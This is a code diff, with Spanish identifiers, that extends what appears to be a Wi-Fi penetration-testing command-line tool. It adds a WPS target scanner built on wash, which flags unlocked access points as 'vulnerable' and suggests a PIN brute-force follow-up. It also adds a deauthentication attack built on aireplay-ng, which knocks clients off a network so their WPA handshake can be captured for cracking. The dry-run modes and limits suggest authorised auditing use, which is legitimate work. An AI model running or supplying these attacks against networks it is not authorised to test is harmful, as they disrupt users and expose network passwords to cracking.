@@ -11,7 +11,7 @@ import shutil
 import subprocess
 import tempfile
 
-from wps_capture_utils import estado_wps
+from wps_capture_utils import estado_wps, lista_wps
 
 
 MAC = re.compile(r"(?:[0-9A-F]{2}:){5}[0-9A-F]{2}\Z")
@@ -180,6 +180,93 @@ def pmkid(interfaz, bssid, canal, banda=None, segundos=30, salida=None, seco=Fal
     return 0 if cantidad else 1
 
 
+def wps_scan(interfaz, canal=None, segundos=20, seco=False):
+    """Escaneo pasivo de objetivos WPS: lista APs con WPS y si anuncian bloqueo."""
+    if not IFACE.fullmatch(interfaz):
+        raise ValueError("interfaz inválida")
+    if canal is not None and not 1 <= canal <= 233:
+        raise ValueError("canal fuera de 1..233")
+    if not 10 <= segundos <= 120:
+        raise ValueError("--segundos debe estar entre 10 y 120")
+    if seco:
+        objetivo = f"canal {canal}" if canal else "barrido de canales"
+        print(f"Plan: wash pasivo {segundos}s en {interfaz} ({objetivo}); sin enviar paquetes")
+        return 0
+    if os.geteuid() != 0:
+        raise ValueError("requiere sudo e interfaz ya en modo monitor")
+    wash = binario("wash")
+    orden = [wash, "-u", "-a", "-i", interfaz]
+    if canal:
+        orden += ["-c", str(canal)]
+    os.umask(0o077)
+    with tempfile.TemporaryDirectory(prefix="wps_scan_") as temporal:
+        try:
+            exploracion = subprocess.run(orden, capture_output=True, timeout=segundos,
+                                         check=False, cwd=temporal)
+            texto = exploracion.stdout.decode(errors="replace")
+        except subprocess.TimeoutExpired as exc:
+            texto = (exc.stdout or b"").decode(errors="replace")
+    filas = lista_wps(texto.splitlines())
+    if not filas:
+        print("Sin APs con WPS observados; el escaneo no demuestra ausencia de WPS")
+        return 1
+    candidatos = 0
+    for bssid, canal_ap, version, lock, essid in filas:
+        bloqueado = lock.lower() in {"yes", "si", "sí", "1"}
+        marca = "vulnerable" if not bloqueado else "bloqueado"
+        if not bloqueado:
+            candidatos += 1
+        print(f"{bssid} canal {canal_ap} WPS {version} {marca} {essid}".rstrip())
+    if candidatos:
+        print(f"{candidatos} objetivo(s) WPS sin bloqueo anunciado; prueba acotada: "
+              f"auditor_generico.sh --tipo wifi-wps-pin --interfaz {interfaz} "
+              f"--bssid <BSSID> --canal <canal>")
+    return 0
+
+
+def deauth(interfaz, bssid, cliente=None, golpes=10, seco=False):
+    """Inyección de desautenticación con aireplay-ng para forzar el 4-way handshake."""
+    bssid = validar_objetivo(interfaz, bssid, 1)
+    if cliente is not None:
+        cliente = cliente.upper()
+        if not MAC.fullmatch(cliente):
+            raise ValueError("MAC de cliente inválida")
+    if not 1 <= golpes <= 20:
+        raise ValueError("--golpes debe estar entre 1 y 20")
+    destino = f"al cliente {cliente}" if cliente else "a todos los clientes"
+    if seco:
+        print(f"Plan: aireplay-ng --deauth {golpes} -a {bssid}"
+              f"{f' -c {cliente}' if cliente else ''} en {interfaz}; "
+              f"desconecta temporalmente {destino} para forzar el 4-way handshake")
+        return 0
+    if os.geteuid() != 0:
+        raise ValueError("requiere sudo e interfaz ya en modo monitor")
+    aireplay = binario("aireplay-ng")
+    orden = [aireplay, "-0", str(golpes), "-a", bssid]
+    if cliente:
+        orden += ["-c", cliente]
+    orden.append(interfaz)
+    os.umask(0o077)
+    with tempfile.TemporaryDirectory(prefix="deauth_") as temporal:
+        try:
+            proceso = subprocess.run(orden, capture_output=True, timeout=120,
+                                     check=False, cwd=temporal)
+        except subprocess.TimeoutExpired:
+            print("aireplay-ng superó el límite de 120s; inyección inconcluyente")
+            return 3
+    resumen = proceso.stdout.decode(errors="replace") + proceso.stderr.decode(errors="replace")
+    if "send failed" in resumen.lower():
+        print("Inyección fallida: el kernel rechazó los paquetes. "
+              "Comprueba que la interfaz está en modo monitor real")
+        return 3
+    if proceso.returncode != 0:
+        print(f"aireplay-ng terminó con código {proceso.returncode}; inyección inconcluyente")
+        return 3
+    print(f"{golpes} desautenticaciones enviadas a {bssid} ({destino}); "
+          "captura el handshake con hcxdumptool/airodump-ng mientras se reconectan")
+    return 0
+
+
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     sub = parser.add_subparsers(dest="accion", required=True)
@@ -195,11 +282,27 @@ def main():
             subparser.add_argument("--banda", choices=("2g", "5g"))
             subparser.add_argument("--segundos", type=int, default=30)
             subparser.add_argument("--salida")
+    deauth_parser = sub.add_parser("wifi-deauth")
+    deauth_parser.add_argument("--interfaz", required=True)
+    deauth_parser.add_argument("--bssid", required=True)
+    deauth_parser.add_argument("--cliente")
+    deauth_parser.add_argument("--golpes", type=int, default=10)
+    deauth_parser.add_argument("--dry-run", action="store_true")
+    scan_parser = sub.add_parser("wifi-wps-scan")
+    scan_parser.add_argument("--interfaz", required=True)
+    scan_parser.add_argument("--canal", type=int)
+    scan_parser.add_argument("--segundos", type=int, default=20)
+    scan_parser.add_argument("--dry-run", action="store_true")
     args = parser.parse_args()
     try:
         if args.accion == "wifi-wps-pin":
             return wps_pin(args.interfaz, args.bssid, args.canal,
                            args.limite_intentos, args.dry_run)
+        if args.accion == "wifi-deauth":
+            return deauth(args.interfaz, args.bssid, args.cliente,
+                          args.golpes, args.dry_run)
+        if args.accion == "wifi-wps-scan":
+            return wps_scan(args.interfaz, args.canal, args.segundos, args.dry_run)
         return pmkid(args.interfaz, args.bssid, args.canal, args.banda,
                      args.segundos, args.salida, args.dry_run)
     except (OSError, ValueError, subprocess.TimeoutExpired) as exc:
